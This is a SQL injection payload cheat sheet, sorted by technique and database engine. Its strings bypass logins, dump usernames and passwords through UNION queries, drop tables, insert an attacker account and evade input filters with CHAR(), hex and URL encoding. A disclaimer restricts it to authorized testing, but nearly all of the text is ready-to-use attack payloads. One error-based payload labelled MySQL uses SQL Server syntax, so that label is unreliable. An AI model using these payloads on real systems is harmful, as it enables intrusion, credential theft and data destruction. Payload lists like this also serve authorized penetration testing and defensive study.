# SQL Injection Payload Cheat Sheet

This cheat sheet contains a comprehensive list of SQL Injection payloads for testing and exploiting SQL vulnerabilities across various databases. **Note:** These payloads are for educational and authorized testing purposes only.

---

## Contents

- [Authentication Bypass Payloads](#authentication-bypass-payloads)
- [Column Discovery with ORDER BY](#column-discovery-with-order-by)
- [Union-Based SQL Injection Payloads](#union-based-sql-injection-payloads)
- [Error-Based SQL Injection Payloads](#error-based-sql-injection-payloads)
- [Boolean-Based Blind SQL Injection Payloads](#boolean-based-blind-sql-injection-payloads)
- [Time-Based Blind SQL Injection Payloads](#time-based-blind-sql-injection-payloads)
- [Stacked Queries (Multiple Statements)](#stacked-queries-multiple-statements)
- [Database Information Extraction](#database-information-extraction)
- [Concatenation-Based SQL Injection Payloads](#concatenation-based-sql-injection-payloads)
  - [MySQL Concatenation](#mysql-concatenation)
  - [Oracle Concatenation](#oracle-concatenation)
  - [PostgreSQL Concatenation](#postgresql-concatenation)
  - [SQL Server Concatenation](#sql-server-concatenation)
  - [Concatenation with CHAR()](#concatenation-with-char)
  - [Recursive Concatenation](#recursive-concatenation)

---

## Authentication Bypass Payloads

```sql
' OR 1=1 --
" OR 1=1 --
' OR 'a'='a
" OR "a"="a"
admin' --
' OR '1'='1' --
```

---

## Column Discovery with ORDER BY

Use `ORDER BY` with incrementing numbers to find the column count.

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 -- /* Continue until an error occurs */
```

---

## Union-Based SQL Injection Payloads

### Basic UNION Payloads

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT 1, 2, 3 --
```

### Extract Data (MySQL)

```sql
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = database() --
' UNION SELECT username, password FROM users --
```

---

## Error-Based SQL Injection Payloads

**Error Payloads for Information Leakage (MySQL)**

```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
' AND (SELECT COUNT(*) FROM information_schema.tables) --
```

**Oracle Error-Based Payload**

```sql
' AND 1=UTL_INADDR.get_host_name('127.0.0.1') --
```

---

## Boolean-Based Blind SQL Injection Payloads

```sql
' AND 1=1 --
' AND 1=2 --
```

---

## Time-Based Blind SQL Injection Payloads

**Time Delay Payloads for MySQL**

```sql
' AND IF(1=1, SLEEP(5), 0) --
```

---

## Stacked Queries (Multiple Statements)

```sql
'; DROP TABLE users --
'; INSERT INTO users (username, password) VALUES ('attacker', 'password') --
```

---

## Database Information Extraction

### Database Version Extraction

```sql
' UNION SELECT @@version -- /* MySQL */
' UNION SELECT version() -- /* PostgreSQL */
```

---

## Concatenation-Based SQL Injection Payloads

Concatenation techniques allow attackers to construct complex payloads by combining strings. Below are some examples for various databases.

### MySQL Concatenation

Use `CONCAT()` to combine strings.

```sql
' UNION SELECT CONCAT(username, ':', password) FROM users --
' AND CONCAT('ad', 'min')='admin' --
```

### Oracle Concatenation

Oracle uses `||` for concatenation.

```sql
' UNION SELECT username || ':' || password FROM users --
' AND ('ad' || 'min')='admin' --
```

### PostgreSQL Concatenation

PostgreSQL also uses `||` for concatenation.

```sql
' UNION SELECT username || ':' || password FROM users --
' AND ('pg_' || 'admin')='pg_admin' --
```

### SQL Server Concatenation

SQL Server uses `+` for concatenation.

```sql
' UNION SELECT username + ':' + password FROM users --
' AND ('ad' + 'min')='admin' --
```

---

### Concatenation with CHAR()

Using `CHAR()` to bypass filters and encode strings as ASCII values.

**MySQL Example**

```sql
' UNION SELECT CONCAT(CHAR(97), CHAR(100), CHAR(109), CHAR(105), CHAR(110)) -- /* Produces 'admin' */
```

**Oracle Example**

```sql
' UNION SELECT CHR(97) || CHR(100) || CHR(109) || CHR(105) || CHR(110) FROM dual --
```

**PostgreSQL Example**

```sql
' UNION SELECT CHR(97) || CHR(100) || CHR(109) || CHR(105) || CHR(110) --
```

**SQL Server Example**

```sql
' UNION SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110) --
```

---

### Recursive Concatenation

Recursive concatenation can build dynamic strings, especially useful for extracting or joining multiple fields in loops.

**SQL Server Example**

```sql
'; DECLARE @data NVARCHAR(MAX) = ''; DECLARE @i INT = 0; WHILE @i < (SELECT COUNT(*) FROM users) BEGIN SET @data = @data + (SELECT username FROM users ORDER BY username OFFSET @i ROWS FETCH NEXT 1 ROWS ONLY); SET @i = @i + 1; END; SELECT @data --
```

---

## Advanced Concatenation Payloads

Combine system and user data dynamically, using concatenation to extract multi-field results.

### Extract Database Version and Name (MySQL)

```sql
' UNION SELECT CONCAT('MySQL version: ', @@version, ', Database: ', database()) --
```

### Extract Table and Column Names (Oracle)

```sql
' UNION SELECT 'Database: ' || name || ' - Table: ' || table_name FROM all_tables, v$database WHERE rownum = 1 --
```

### Concatenate Results with Newline (SQL Server)

```sql
' UNION SELECT username + CHAR(10) + password FROM users --
```

---

## Additional Notes

- **Encoding and Obfuscation**: Using `%27` for single quotes and `%20` for spaces can help bypass basic filters.
- **Hex Encoding**: Some databases allow hex encoding. Example (MySQL): `' UNION SELECT 0x61646D696E --` for `'admin'`.

---

### License

This cheat sheet is open-sourced and can be used for ethical testing and research. Unauthorized or illegal testing is prohibited.
